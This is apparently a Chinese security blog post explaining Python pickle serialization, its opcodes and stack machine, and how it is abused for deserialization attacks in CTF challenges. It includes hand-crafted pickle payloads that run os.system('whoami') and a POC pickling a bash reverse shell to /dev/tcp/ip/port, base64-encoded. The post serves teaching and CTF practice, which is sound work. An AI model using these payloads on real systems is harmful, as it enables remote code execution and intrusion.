<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf8" />
    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
    <title>
      
        pickle | 东隅's blog
      
    </title>
    <meta name="description" content=""/>
    <meta name="keywords" content=""/>
    
      <link rel="apple-touch-icon"
            sizes="180x180"
            href="/images/jocker.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="32x32"
            href="/images/jocker.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="16x16"
            href="/images/jocker.png"/>
    
    
      <link rel="mask-icon"
            href="/images/jocker.png"
            color=""/>
    
    
    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
    
    
  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
  

  <meta name="generator" content="Hexo 5.4.0"></head>
  <body>
    <div class="head">
      <div class="nav">
        <a href="/" class="nav-logo">
          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
        </a>
        <input id="navBtn" type="checkbox"/>
        <div class="nav-menu">
          
            
              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
            
              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
            
              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
            
          
        </div>
        <label class="nav-btn" for="navBtn"></label>
      </div>
    </div>
    <div class="body">
      
  <article class="post-content">
    <div class="post-inner">
      <div class="post-content__head">
        <div class="post-title">pickle</div>
        <div class="post-info">
          
  
    <a href="/tags/python%E5%AE%89%E5%85%A8/" class="post-tag">#python安全</a>
  


          <span class="post-date">2023-04-08</span>
        </div>
      </div>
      <div id="postBody" class="post-content__body--toc">
        <div id="tocAnchor" class="toc-anchor">
          <ol id="toc" class="post-toc">
            
              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-text">引言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86"><span class="toc-text">认识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E7%89%B9%E7%82%B9"><span class="toc-text">pickle特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E5%AF%B9%E6%AF%94json"><span class="toc-text">pickle对比json</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-text">可序列化的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E5%8D%8F%E8%AE%AE"><span class="toc-text">pickle协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#opcode"><span class="toc-text">opcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">pickle工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%86%99opcode"><span class="toc-text">手写opcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-text">用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86%EF%BC%9Apickle-EXP%E7%9A%84%E7%AE%80%E5%8D%95demo"><span class="toc-text">初步认识：pickle EXP的简单demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pker"><span class="toc-text">pker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#watevrCTF-2019-Pickle-Store"><span class="toc-text">[watevrCTF-2019]Pickle Store</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun"><span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E7%AB%A0"><span class="toc-text">文章</span></a></li></ol>
            
          </ol>
        </div>
        
          <div class="post-gallery">
            
          </div>
        
        <h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>在日常开发中，所有的对象都是存储在内存当中，尤其是像python这样的坚持一切接对象的高级程序设计语言，一旦关机，在写在内存中的数据都将不复存在。另一方面，存储在内存够中的对象由于编程语言、网络环境等等因素，很难在网络中进行传输交互。由此，就诞生了一种机制，可以实现内存中的对象与方便持久化在磁盘中或在网络中进行交互的数据格式（str、bites)之间的相互转换。这种机制就叫序列化与发序列化：</p>
<p>　　<strong>序列化：将内存中的不可持久化和传输对象转换为可方便持久化和传输对象的过程。</strong></p>
<p>　　<strong>反序列化：将可持久化和传输对象转换为不可持久化和传输对象的过程。</strong></p>
<p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p>
<p>既然opcode能够执行Python代码，那自然就免不了安全问题。</p>
<h1 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h1><p>pickle序列化是python进行序列化和反序列化常用的方法，除了pickle之外，Python中还有其他可用的序列化和反序列化方法。其中一些方法包括：</p>
<blockquote>
<ol>
<li>JSON（JavaScript对象表示法）- 这是一种轻量级的数据交换格式，易于人类阅读和编写，也易于机器解析和生成。它通常用于Web应用程序和API。</li>
<li>YAML（YAML Ain’t Markup Language）- 这是一种可读性强的数据序列化格式，常用于配置文件和编程语言之间的数据交换。</li>
<li>msgpack - 这是一种二进制序列化格式，旨在实现高效和快速。它通常用于高性能应用程序中的数据交换。</li>
<li>protobuf - 这是一种语言中立的数据序列化格式，旨在实现高效和紧凑。它通常用于分布式系统中的网络通信。</li>
<li>avro - 这是一种数据序列化系统，旨在支持动态模式和高效的二进制编码。它通常用于大数据处理系统，例如Hadoop。</li>
</ol>
</blockquote>
<h2 id="pickle特点"><a href="#pickle特点" class="headerlink" title="pickle特点"></a><code>pickle特点</code></h2><blockquote>
<ol>
<li>能够直接序列化大多数 <code>Python</code> 对象，方便</li>
<li>能够以更快的速度序列化 <code>Python</code> 对象，快速</li>
<li>pickle 支持多种协议，可以在不同的 Python 版本和系统之间进行交互。其中，协议版本 0 是最古老和最基本的版本，协议版本 4 是 Python 3.4 及以上版本的默认协议版本。<ul>
<li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。</li>
<li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li>
<li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0307"><strong>PEP 307</strong></a>。</li>
<li>v3 版协议添加于 Python 3.0。它具有对 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li>
<li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-3154"><strong>PEP 3154</strong></a>。</li>
</ul>
</li>
<li>pickle 是 Python 标准库中的一部分，因此无需安装额外的库即可使用</li>
<li>pickle 可以将 Python 对象直接序列化为二进制格式，因此它的序列化结果可以存储到文件或传输到其他计算机上。</li>
</ol>
</blockquote>
<h2 id="pickle对比json"><a href="#pickle对比json" class="headerlink" title="pickle对比json"></a><code>pickle对比json</code></h2><blockquote>
<ul>
<li><p>序列化数据类型：</p>
<p>pickle：pickle可以序列化几乎所有Python对象，包括自定义类和函数。</p>
<p>json：json只能序列化Python中的基本数据类型，例如字符串、数字、列表、字典、元组和布尔值。</p>
</li>
<li><p>可读性：</p>
<p>pickle：pickle序列化后的数据是二进制形式的，因此不可读。但pickle可以很好地处理Python特有的数据类型，例如函数和类等。</p>
<p>json：json序列化后的数据是文本形式的，因此易于阅读和调试。但是，它不能很好地处理Python特有的数据类型。</p>
</li>
<li><p>跨语言支持：</p>
<p>pickle：pickle只支持Python，因此不能在其他语言之间传递数据。</p>
<p>json：json是一种通用的数据格式，可以被几乎所有编程语言支持，因此适合在不同的编程语言之间传递数据。</p>
</li>
<li><p>安全性：</p>
<p>pickle：由于pickle序列化的数据可以包含任意代码，因此有安全隐患。因此，不应将pickle用于不受信任的源。</p>
<p>json：json序列化的数据不包含代码，因此较为安全。</p>
</li>
</ul>
</blockquote>
<h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a><code>可序列化的对象</code></h2><blockquote>
<ul>
<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
<li>整数、浮点数、复数</li>
<li>str、byte、bytearray</li>
<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>
<li>定义在模块最外层的内置函数</li>
<li>定义在模块最外层的类</li>
<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
</ul>
</blockquote>
<h2 id="pickle协议"><a href="#pickle协议" class="headerlink" title="pickle协议"></a><code>pickle协议</code></h2><blockquote>
<p>pickle协议的主要特点包括：</p>
<ul>
<li>支持循环引用和共享对象（即相同的对象在序列化时只会被序列化一次，而在反序列化时被恢复为同一个对象）；</li>
<li>可以自定义对象的序列化和反序列化过程，通过实现<code>__reduce__()</code>、<code>__getstate__()</code>和<code>__setstate__()</code>等方法来控制对象在序列化和反序列化过程中的状态；</li>
<li>支持多种编码格式，如二进制编码、ASCII编码、Unicode编码等；</li>
<li>可以序列化任意Python对象，包括自定义对象和函数等。</li>
</ul>
</blockquote>
<blockquote>
<p>在pickle中，可以通过实现以下三种方法来控制对象在序列化和反序列化过程中的状态：</p>
<ol>
<li><code>__reduce__()</code>: 这个方法可以用来控制对象在序列化时的状态。当pickle序列化一个对象时，它会尝试调用这个对象的<code>__reduce__()</code>方法，这个魔术方法简单的来说可php的<code>__wakeup</code>差不多,就是在被序列化的时候告诉系统如何运行，他的返回值第一个参数是函数名，第二个参数是一个tuple，为第一个函数的参数</li>
<li><code>__getstate__()</code>和<code>__setstate__()</code>: 这两个方法可以用来控制对象在序列化和反序列化时的状态。当pickle序列化一个对象时，它会先尝试调用这个对象的<code>__getstate__()</code>方法，将其返回的状态数据作为序列化结果。反序列化时，pickle会先调用对象的构造函数来创建对象，然后调用<code>__setstate__()</code>方法，将反序列化得到的状态数据传递给对象进行状态恢复。</li>
</ol>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;name&quot;</span>: self.name, <span class="string">&quot;age&quot;</span>: self.age&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span>(<span class="params">self, state</span>):</span></span><br><span class="line">        self.name = state[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">        self.age = state[<span class="string">&quot;age&quot;</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (Person, (self.name, self.age))</span><br><span class="line"></span><br><span class="line">p = Person(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>)</span><br><span class="line">serialized = pickle.dumps(p)</span><br><span class="line">deserialized = pickle.loads(serialized)</span><br><span class="line"><span class="built_in">print</span>(deserialized.name)  <span class="comment"># Alice</span></span><br><span class="line"><span class="built_in">print</span>(deserialized.age)  <span class="comment"># 25</span></span><br></pre></td></tr></table></figure>



<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a><code>opcode</code></h2><p>opcode是Python字节码的一种表示形式。字节码是Python代码经过编译后生成的中间代码，它比源代码更接近计算机底层，可以被Python虚拟机（简称PVM）直接执行。</p>
<p>在Python中，pickle序列化过程中使用的opcode（operation code）是一种特殊的二进制指令，用于描述pickle数据流中的不同数据类型和结构。Python中的pickle协议定义了一组opcode，不同版本的协议会支持不同的opcode。</p>
<p>可以使用pickletools模块来解析和分析pickle数据流中的opcode序列，使用pickletools可以方便的将opcode转化为便于肉眼读取的形式，可以对pickle数据流进行反汇编、可视化、语义解释等等操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins exec&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: X    BINUNICODE <span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span></span><br><span class="line">   <span class="number">43</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">45</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">48</span>: R    REDUCE</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">51</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure>



<h2 id="pickle工作原理"><a href="#pickle工作原理" class="headerlink" title="pickle工作原理"></a><code>pickle工作原理</code></h2><p>我们上文提到了，其实pickle可以看作是一种独立的栈语言，它由一串串opcode（指令集）组成。该语言的解析是依靠Pickle Virtual Machine （PVM）进行的。</p>
<p>PVM由以下三部分组成</p>
<ul>
<li><p>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。</p>
</li>
<li><p>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象。</p>
</li>
<li><p>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储。</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231117124.png" alt="image-20230323111721008"></p>
</li>
</ul>
<h2 id="手写opcode"><a href="#手写opcode" class="headerlink" title="手写opcode"></a>手写opcode</h2><ul>
<li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li>
<li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
<li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode</li>
</ul>
<p>常用的opcode如下：</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o(函数执行)</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i(函数执行)</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象（可以识别16进制）</td>
<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R(函数执行)</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody></table>
<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。<br>由这些opcode我们可以得到一些需要注意的地方：</p>
<ul>
<li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li>
<li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
<li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
</ul>
<p><code>举例</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#xiaoh\34946</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">cos</span><br><span class="line">system   <span class="comment">#字节码为c，形式为c[moudle]\n[instance]\n，导入os.system。并将函数压入stack</span></span><br><span class="line"> </span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span>   <span class="comment">#字节码为(，向stack中压入一个MARK。字节码为S，示例化一个字符串对象&#x27;whoami&#x27;并将其压入stack</span></span><br><span class="line"> </span><br><span class="line">tR       <span class="comment">#字节码为t，寻找栈中MARK，并组合之间的数据为元组。然后通过字节码R执行os.system(&#x27;whoami&#x27;)</span></span><br><span class="line"> </span><br><span class="line">.        <span class="comment">#字节码为.，程序结束，将栈顶元素os.system(&#x27;ls&#x27;)作为返回值</span></span><br></pre></td></tr></table></figure>

<p>我们可以使用pickletools模块，将opcode转化成方便我们阅读的形式，如下所示</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: (    MARK</span><br><span class="line">   <span class="number">12</span>: S        STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">22</span>: t        TUPLE      (MARK at <span class="number">11</span>)</span><br><span class="line">   <span class="number">23</span>: R    REDUCE</span><br><span class="line">   <span class="number">24</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure>



<p><code>POC</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">a = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = pickletools.optimize(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># b&#x27;(cos\nsystem\nS\&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\&#x27;\no.&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMSInCm8u&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







